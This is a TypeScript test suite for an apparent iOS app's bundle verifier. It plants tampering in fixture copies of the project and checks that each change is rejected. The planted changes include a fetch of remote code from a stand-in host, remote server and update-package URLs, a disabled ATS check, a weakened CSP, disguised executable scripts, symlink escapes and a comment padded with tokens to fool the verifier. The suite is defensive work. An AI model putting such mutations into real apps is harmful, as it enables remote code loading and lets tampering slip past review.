import assert from "node:assert/strict";
import {
  chmodSync,
  cpSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import test from "node:test";
import { pathToFileURL } from "node:url";

const ROOT = process.cwd();
const { verifyBuiltApp, verifySource } = await import(
  pathToFileURL(join(ROOT, "scripts/ios/verify-bundle.mjs")).href
) as typeof import("../../scripts/ios/verify-bundle.mjs");

function fixture(context: test.TestContext): string {
  const root = mkdtempSync(join(tmpdir(), "greenroom-iphone-boundary-"));
  context.after(() => rmSync(root, { recursive: true, force: true }));
  for (const path of ["capacitor.config.ts", "package.json"]) {
    cpSync(join(ROOT, path), join(root, path));
  }
  cpSync(join(ROOT, "ios-web"), join(root, "ios-web"), { recursive: true });
  mkdirSync(join(root, "ios"), { recursive: true });
  cpSync(join(ROOT, "ios", "App"), join(root, "ios", "App"), { recursive: true });
  return root;
}

function rewrite(root: string, path: string, transform: (source: string) => string): void {
  const absolute = join(root, path);
  writeFileSync(absolute, transform(readFileSync(absolute, "utf8")));
}

function rejects(root: string, pattern: RegExp): void {
  assert.throws(() => verifySource(root), pattern);
}

test("repository contains and passes the complete iPhone source boundary", () => {
  for (const path of [
    "capacitor.config.ts",
    "ios/App/App.xcodeproj/project.pbxproj",
    "ios/App/App/ContainedBridgeViewController.swift",
    "ios/App/App/PrivacyInfo.xcprivacy",
    "ios-web/index.html",
    "scripts/ios/verify-bundle.mjs",
  ]) {
    assert.equal(existsSync(join(ROOT, path)), true, `missing ${path}`);
  }
  assert.deepEqual(verifySource(ROOT).deviceFamily, [1]);
  const packageJson = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")) as { scripts: Record<string, string> };
  assert.match(packageJson.scripts["ios:test"] ?? "", /run-ios-test\.mjs/u);
  const gate = readFileSync(join(ROOT, "scripts/ios/run-ios-test.mjs"), "utf8");
  assert.match(gate, /process\.platform !== "darwin"/u);
  assert.match(gate, /run-simulator-offline\.mjs/u);
});

test("remote entry URLs and generated navigation allowances fail closed", (context) => {
  const root = fixture(context);
  rewrite(root, "capacitor.config.ts", (source) => source.replace("webDir: \"ios-web\",", "webDir: \"ios-web\",\n  server: { url: \"https://evil.invalid/app.js\" },"));
  rejects(root, /remote-entry|remote URL/u);

  cpSync(join(ROOT, "capacitor.config.ts"), join(root, "capacitor.config.ts"));
  rewrite(root, "ios/App/App/capacitor.config.json", (source) => source.replace('"packageClassList": []', '"server": {"url":"https://evil.invalid"},\n\t"packageClassList": []'));
  rejects(root, /keys are not exact|remote server/u);
});

test("dynamic update dependencies and native packages fail closed", (context) => {
  const root = fixture(context);
  rewrite(root, "package.json", (source) => source.replace('"@capacitor/core": "8.5.1",', '"@capacitor/core": "8.5.1",\n    "capacitor-updater": "1.0.0",'));
  rejects(root, /dynamic-update package/u);

  cpSync(join(ROOT, "package.json"), join(root, "package.json"));
  rewrite(root, "ios/App/CapApp-SPM/Package.swift", (source) => source.replace("dependencies: [", 'dependencies: [\n        .package(url: "https://evil.invalid/update.git", exact: "1.0.0"),'));
  rejects(root, /native package dependency/u);
});

test("ATS exceptions and background modes fail closed", (context) => {
  const root = fixture(context);
  rewrite(root, "ios/App/App/Info.plist", (source) => source.replace("<dict>", "<dict>\n<key>NSAppTransportSecurity</key><dict><key>NSAllowsArbitraryLoads</key><true/></dict>"));
  rejects(root, /ATS|Info\.plist/u);

  cpSync(join(ROOT, "ios/App/App/Info.plist"), join(root, "ios/App/App/Info.plist"));
  rewrite(root, "ios/App/App/Info.plist", (source) => source.replace("<dict>", "<dict>\n<key>UIBackgroundModes</key><array><string>fetch</string></array>"));
  rejects(root, /background|Info\.plist/u);
});

test("Node, Python, disguised executables, and undeclared frameworks fail closed", (context) => {
  const root = fixture(context);
  const payload = join(root, "ios/App/App", "innocent.dat");
  writeFileSync(payload, "#!/usr/bin/env node\nprocess.exit(0)\n");
  chmodSync(payload, 0o755);
  rejects(root, /executable or disguised binary/u);

  rmSync(payload);
  mkdirSync(join(root, "ios/App/App/Frameworks/Renamed.framework"), { recursive: true });
  rejects(root, /undeclared native bundle/u);
});

test("CSP weakening and remote shell assets fail closed", (context) => {
  const root = fixture(context);
  rewrite(root, "ios-web/index.html", (source) => source.replace("connect-src 'none'", "connect-src https://evil.invalid"));
  rejects(root, /reviewed bytes|CSP connect-src|weakening/u);

  cpSync(join(ROOT, "ios-web/index.html"), join(root, "ios-web/index.html"));
  rewrite(root, "ios-web/room-runtime.js", (source) => `${source}\nfetch("https://evil.invalid/code.js");\n`);
  rejects(root, /reviewed bytes|remote URL/u);

  cpSync(join(ROOT, "ios-web/index.html"), join(root, "ios-web/index.html"));
  cpSync(join(ROOT, "ios-web/room-runtime.js"), join(root, "ios-web/room-runtime.js"));
  rewrite(root, "ios-web/index.html", (source) => source.replace(
    /(<meta\s+http-equiv="Content-Security-Policy"[\s\S]*?>)/u,
    "<!-- $1 -->",
  ));
  rejects(root, /reviewed bytes|CSP/u);

  cpSync(join(ROOT, "ios-web/index.html"), join(root, "ios-web/index.html"));
  rewrite(root, "ios-web/index.html", (source) => source.replace("</head>", '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'">\n</head>'));
  rejects(root, /reviewed bytes|CSP/u);

  cpSync(join(ROOT, "ios-web/index.html"), join(root, "ios-web/index.html"));
  rewrite(root, "ios-web/index.html", (source) => source.replace("content=\"default-src", "content=default-src"));
  rejects(root, /reviewed bytes|CSP/u);
});

test("navigation delegate weakening and window escape fail closed", (context) => {
  const root = fixture(context);
  rewrite(root, "ios/App/App/ContainedBridgeViewController.swift", (source) => source.replace("candidate.scheme == localOrigin.scheme", "candidate.scheme == \"https\""));
  rejects(root, /reviewed bytes|native containment is missing/u);

  cpSync(join(ROOT, "ios/App/App/ContainedBridgeViewController.swift"), join(root, "ios/App/App/ContainedBridgeViewController.swift"));
  rewrite(root, "ios/App/App/ContainedBridgeViewController.swift", (source) => `${source}\n// UIApplication.shared.open is forbidden even in future handoff code\n`);
  rejects(root, /reviewed bytes|external-navigation/u);

  cpSync(join(ROOT, "ios/App/App/ContainedBridgeViewController.swift"), join(root, "ios/App/App/ContainedBridgeViewController.swift"));
  rewrite(root, "ios/App/App/ContainedBridgeViewController.swift", (source) => source.replace(
    "guard isBundledNavigation(navigationAction) else {",
    "if false && !isBundledNavigation(navigationAction) {",
  ) + "\n// verifier-tokens-only: action.targetFrame != nil candidate.scheme == localOrigin.scheme candidate.host == localOrigin.host candidate.port == localOrigin.port decisionHandler(.cancel) createWebViewWith return nil capacitorDelegate.webView\n");
  rejects(root, /reviewed bytes|native containment/u);
});

test("wrong bundle identifier, minimum OS, and device family fail closed", (context) => {
  const root = fixture(context);
  rewrite(root, "ios/App/App.xcodeproj/project.pbxproj", (source) => source.replaceAll("net.greenroomai.GreenRoom", "net.greenroomai.Wrong"));
  rejects(root, /bundle identifier/u);

  cpSync(join(ROOT, "ios/App/App.xcodeproj/project.pbxproj"), join(root, "ios/App/App.xcodeproj/project.pbxproj"));
  rewrite(root, "ios/App/App.xcodeproj/project.pbxproj", (source) => source.replace("IPHONEOS_DEPLOYMENT_TARGET = 18.6", "IPHONEOS_DEPLOYMENT_TARGET = 18.5"));
  rejects(root, /deployment target/u);

  cpSync(join(ROOT, "ios/App/App.xcodeproj/project.pbxproj"), join(root, "ios/App/App.xcodeproj/project.pbxproj"));
  rewrite(root, "ios/App/App.xcodeproj/project.pbxproj", (source) => source.replace("TARGETED_DEVICE_FAMILY = 1", 'TARGETED_DEVICE_FAMILY = "1,2"'));
  rejects(root, /iPhone-only/u);
});

test("symlinks and linked escape payloads fail closed without following", (context) => {
  const root = fixture(context);
  const outside = join(root, "..", `outside-${Date.now()}.js`);
  context.after(() => rmSync(outside, { force: true }));
  writeFileSync(outside, "outside payload\n");
  const shell = join(root, "ios/App/App/public/room-runtime.js");
  rmSync(shell);
  symlinkSync(outside, shell);
  rejects(root, /symbolic link is forbidden/u);
  assert.equal(readFileSync(outside, "utf8"), "outside payload\n");
});

test("privacy claims, deploy re-enablement, and extra plugin bundles fail closed", (context) => {
  const root = fixture(context);
  rewrite(root, "ios/App/App/PrivacyInfo.xcprivacy", (source) => source.replace("<false/>", "<true/>"));
  rejects(root, /privacy manifest/u);

  cpSync(join(ROOT, "ios/App/App/PrivacyInfo.xcprivacy"), join(root, "ios/App/App/PrivacyInfo.xcprivacy"));
  rewrite(root, "ios/App/App/config.xml", (source) => source.replace('value="true"', 'value="false"'));
  rejects(root, /Cordova config/u);

  cpSync(join(ROOT, "ios/App/App/config.xml"), join(root, "ios/App/App/config.xml"));
  mkdirSync(join(root, "ios/App/App/Plugins/Evil.bundle"), { recursive: true });
  rejects(root, /undeclared native bundle/u);

  rmSync(join(root, "ios/App/App/Plugins"), { recursive: true, force: true });
  rewrite(root, "ios/App/App/PrivacyInfo.xcprivacy", (source) => source.replace("</plist>", "<broken></plist>"));
  rejects(root, /privacy manifest/u);

  cpSync(join(ROOT, "ios/App/App/PrivacyInfo.xcprivacy"), join(root, "ios/App/App/PrivacyInfo.xcprivacy"));
  writeFileSync(join(root, "ios/App/App/Evil.swift"), "import Foundation\n");
  rejects(root, /Swift source inventory/u);
});

test("built verifier rejects arbitrary executable and script payloads", { skip: process.platform !== "darwin" }, (context) => {
  const sourceApp = join(ROOT, ".build/ios/Build/Products/Debug-iphonesimulator/App.app");
  if (!existsSync(sourceApp)) {
    context.skip("Darwin built-app mutations run after ios:build in the declared ios:test gate");
    return;
  }
  const app = join(mkdtempSync(join(tmpdir(), "greenroom-built-app-")), "App.app");
  context.after(() => rmSync(dirname(app), { recursive: true, force: true }));
  cpSync(sourceApp, app, { recursive: true });
  const payload = join(app, "innocent.dat");
  writeFileSync(payload, "harmless bytes\n");
  chmodSync(payload, 0o755);
  assert.throws(() => verifyBuiltApp(app), /unexpected executable mode/u);
  chmodSync(payload, 0o644);
  writeFileSync(payload, "#!/usr/bin/env python3\nprint('hello')\n");
  assert.throws(() => verifyBuiltApp(app), /script payload/u);
});

test("built verifier gates trusted Apple plist parsing to Darwin", { skip: process.platform === "darwin" }, () => {
  assert.throws(() => verifyBuiltApp("/tmp/nonexistent.app"), /root must be a real directory|built \.app verification requires/u);
});
